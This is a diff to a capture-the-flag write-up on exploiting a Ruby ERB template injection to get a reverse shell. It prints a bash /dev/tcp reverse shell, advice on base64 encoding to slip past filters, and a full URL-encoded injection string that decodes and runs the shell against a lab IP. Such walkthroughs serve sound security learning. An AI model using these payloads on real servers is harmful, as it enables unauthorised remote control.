@@ -1,3 +1,7 @@
+# Tutorial
+
+Note: For better understanding I recommend reading first "Headless" machine as I explain some fundamentals there.
+
 Let's start pinging:
 
 (pic1)
@@ -46,11 +50,37 @@ So, we know that the site uses html content, but the backend uses Ruby. So it is
 In the URL they show the case `<%= 7 * 7 %>`.
 Nonetheless our goal is to inject a reverse shell into the Ruby webserver, not multiplying. So in Ruby terminology would be something of style:
 `<%= system("echo + payload");=>'.
-Also, we must know that the Ruby server only interpretates commands URL encoded. So both the payload and the command injection myst be URL encoded.
+Also, when performing an ERB injection in a Ruby-based web application, URL encoding is necessary because the payload nedds to be sent as part of an HTTP request. So both the payload and the command injection must be URL encoded.
 Reading this documentation (in Spanish) https://www.uv.es/jac/guia/hexawin.htm
 The command injection must be as follows:
 `<%25%3dsystem("echo+URLencoded(payload);%25>`.
-Using our previously encoded payload (first into base64 and later into URL encode) the final command injection is as follows:
+
+Now is the moment to insert the payload. Let's prepare it.
+
+##### The Payload
+
+The payload used is going to be the same as in the previous machine `Headless`. The command is the following:
+```
+bash -i >& /dev/tcp/{IP}/{port} 0>&1
+```
+`bash -i` starts an interactive bash shell
+`>& /dev/tcp/{IP}/{port} 0>&1`: Redirects the input and output of the bash shell (target) to a TCP connection to {IP} on port {port} (to our netcat listerner).
+
+This effectively sets up a reverse shell, where the compromised server connects back to the attacker's machine, giving the attacker remote control over the server.
+
+You must be aware that you cannot inject the payload directly. It is necessary to encode it into Base64. Why? Shell commands often contain special characters that could be misinterpreted by the server or web application. Also, characters like spaces or special symbols (<, >, &) can break the command or be deleted by security mechanisms from the server. So, encoding the command in base64 makes it less likely to be detected and blocked by such filters because the payload appears as a harmless string of alphanumeric characters. So, using the reasoning explained by encoding the reverse shell injection command into Base64 and later into URL encoding, the outcome is as follows:
+
+(pic10)
+
+##### The listener
+
+Now, time to set up the listener:
+
+(pic11)
+
+##### Inject the reverse Shell
+
+Time to inject the reverse shell. Using our previously encoded payload (first into base64 and later into URL encode) the final command injection is as follows:
 
 category1=test1%0A<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43Ni83MzczIDA%2BJjE%3D|+base64+-d+|+bash");%25>1
 
@@ -63,9 +93,4 @@ The part `|+base64+-d+|+bash`in the injection payload is used to decode a base64
 
 The base64 string decodes into:
 
-bash -i >& /dev/tcp/10.10.14.76/7373 0>&1
 
-`bash -i` starts an interactive bash shell
-`>& /dev/tcp/10.10.14.76/7373 0>&1`: Redirects the input and output of the bash shell (target) to a TCP connection to 10.10.14.76 on port 7373 (to our netcat listerner).
-
-This effectively sets up a reverse shell, where the compromised server connects back to the attacker's machine, giving the attacker remote control over the server.
